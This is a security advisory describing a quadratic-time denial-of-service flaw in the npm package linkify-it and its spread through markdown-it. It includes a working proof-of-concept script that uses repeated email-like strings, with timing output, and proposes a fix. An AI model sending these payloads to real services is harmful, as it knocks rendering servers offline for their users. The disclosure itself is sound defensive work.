# [H] LinkifyIt#match scan loop has quadratic algorithmic complexity

## Summary
Severity: High
Advisory: GHSA-22p9-wv53-3rq4
CVE: CVE-2026-48801
CWE: CWE-1333
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-22p9-wv53-3rq4
Type: github-advisory

## Affected
- npm: `linkify-it` — affected >=0 <5.0.1

## Details
## Summary

`LinkifyIt.prototype.match` — the package's primary public API — has **O(N²) algorithmic complexity** for inputs containing many fuzzy links or emails. This is not a regex backtrack bug; it's a structural issue in the JS-level scan loop that re-slices the input and re-runs unanchored regex searches on progressively shorter tails, N times.

64 KB of `"a@b.com\n"` repeated burns ~2.5 s of single-threaded CPU; 128 KB takes ~10 s. Doubling the input quadruples the time — textbook O(N²).

The same cost passes through `markdown-it` (`linkify:true`) unmodified. Any service that synchronously renders untrusted Markdown with linkify enabled on a request hot-path (forums, comments, chat, wikis, AI chat UIs) inherits a worker-process DoS triggerable by a tens-of-KB request body.

## Affected component

- HEAD audited: `8e887d5bace3f5b09b1d1f70492fa0364ef1793d` (v5.0.0)
- Vulnerable function: `LinkifyIt.prototype.match` — `index.mjs:528-554`
- Re-scan call sites inside `test()`: `index.mjs:444` (fuzzy host search), `:448` (fuzzy link match), `:467` (fuzzy email match)
- Transitive consumer: `markdown-it` (~21.6M weekly npm DLs) calls `linkify.match()` at `lib/rules_core/linkify.mjs:57` when `linkify:true`
- **All versions affected** — the vulnerable loop exists since the initial commit (2014) through v5.0.0

## Vulnerability details

### The O(N²) outer loop

`index.mjs:528-554`:

```js
LinkifyIt.prototype.match = function match (text) {
  const result = []
  let shift = 0
  let tail = shift ? text.slice(shift) : text

  while (this.test(tail)) {
    result.push(createMatch(this, shift))
    tail = tail.slice(this.__last_index__)   // <-- re-allocates remaining tail each iteration
    shift += this.__last_index__
  }

  if (result.length) return result
  return null
}
```

The loop iterates O(N) times (once per match). Each iteration:
1. `tail.slice()` re-allocates a string of length `|text| - shift` — O(N) per iteration
2. `this.test(tail)` runs three unanchored regex searches over the full new `tail`:

```js
// index.mjs:444 — full-tail search
tld_pos = text.search(this.re.host_fuzzy_test)
// index.mjs:448 — full-tail match
ml = text.match(this.re.link_fuzzy)
// index.mjs:467 — full-tail match
me = text.match(this.re.email_fuzzy)
```

Total cost: `Σ(N - i*c) for i=0..N = O(N²)`.

### Contrast with the linear schema branch

The schema-prefixed scan in the same `test()` function does it correctly at `index.mjs:428-440`:

```js
re = this.re.schema_search
re.lastIndex = 0
while ((m = re.exec(text)) !== null) { ... }
```

That branch uses a `g`-flag RegExp and advances `lastIndex` — linear. The fuzzy branches don't follow this pattern.

## Proof of concept

```bash
mkdir /tmp/linkifyit-redos && cd /tmp/linkifyit-redos
npm install linkify-it@5.0.0

cat > poc.mjs <<'EOF'
import LinkifyIt from 'linkify-it'
const l = new LinkifyIt()
for (const n of [1000, 2000, 4000, 8000, 16000]) {
  const evil = 'a@b.com\n'.repeat(n)
  const t0 = process.hrtime.bigint()
  l.match(evil)
  const ms = Number(process.hrtime.bigint() - t0) / 1e6
  console.log(`n=${n} bytes=${evil.length} took ${ms.toFixed(0)} ms`)
}
EOF
node poc.mjs
```

### Measured output (Node v25.5.0, Apple Silicon)

```
n=1000  bytes=8000    took 44 ms
n=2000  bytes=16000   took 159 ms
n=4000  bytes=32000   took 628 ms
n=8000  bytes=64000   took 2506 ms
n=16000 bytes=128000  took 9948 ms
```

Doubling N → ~4× wall-clock, consistent with O(N²).

### markdown-it transitive (independently confirmed)

```bash
npm install markdown-it@14.1.1
node -e "
  const md = require('markdown-it')({ linkify: true })
  for (const n of [1000, 2000, 4000, 8000]) {
    const evil = 'a@b.com '.repeat(n)
    const t0 = process.hrtime.bigint()
    md.render(evil)
    const ms = Number(process.hrtime.bigint() - t0) / 1e6
    console.log('n=' + n + ' bytes=' + evil.length + ' md.render=' + ms.toFixed(0) + 'ms')
  }
"
```

```
n=1000 bytes=8000   md.render=45ms
n=2000 bytes=16000  md.render=171ms
n=4000 bytes=32000  md.render=672ms
n=8000 bytes=64000  md.render=2636ms
```

Same quadratic curve. 64 KB is enough to burn 2.6 s in `markdown-it.render()`.

## Impact

- **Availability (High)**: A single HTTP request containing tens of KB of repeated email-like strings blocks one worker thread for seconds to tens of seconds. Under moderate concurrency (10-50 requests), the entire rendering tier of an affected service is wedged.
- No confidentiality or integrity impact.

**Real-world scenario**: Any service that renders untrusted Markdown with `linkify:true` on the request path — Discourse, Mattermost, GitLab CE, AI chat UIs (Open WebUI, LibreChat), wiki/note apps using markdown-it — receives a post/comment containing 64 KB of `"a@b.com "`. The render call blocks the worker for 2.5+ seconds. Scripted at scale, this wedges the rendering tier.

## Suggested remediation

The fix is algorithmic — convert the outer scan loop to stateful regex iteration so each character is examined a constant number of times:

1. Add the `g` flag to `email_fuzzy`, `link_fuzzy`, `link_no_ip_fuzzy`, `host_fuzzy_test` in `lib/re.mjs`
2. Rewrite `test()` (or add `testAt(text, pos)`) so fuzzy branches set `re.lastIndex = pos` and call `re.exec(text)` instead of `text.match()`/`text.search()` on a sliced tail
3. In `match()`, drop `tail = tail.slice(...)` entirely — advance a `pos` offset instead

The schema branch at `index.mjs:428-440` is already structured this way — it's the in-repo precedent for the fix.

```js
// proposed sketch
LinkifyIt.prototype.match = function match (text) {
  const result = []
  let pos = 0
  while (this.testAt(text, pos)) {
    result.push(createMatch(this, 0))
    pos = this.__last_index__
  }
  return result.length ? result : null
}
```

Total cost becomes O(N): each character scanned at most once per regex across the whole loop.

## Duplicate-risk analysis

- Zero GHSAs on `linkify-it` (`gh api /repos/markdown-it/linkify-it/security-advisories` → `[]`)
- Zero OSV entries (`api.osv.dev/v1/query` → `{}`)
- markdown-it's only GHSA (CVE-2022-21670, "Possible ReDOS in newline rule") targets markdown-it's own newline regex, not the linkify pipeline

This finding appears novel.

## Note to maintainers

Since `markdown-it` is the dominant consumer and shares maintainership (Vitaly Puzrin), a patched `linkify-it` release should be paired with a `markdown-it` minor that pins the new minimum version.

## References
- https://github.com/markdown-it/linkify-it/security/advisories/GHSA-22p9-wv53-3rq4
- https://github.com/markdown-it/linkify-it
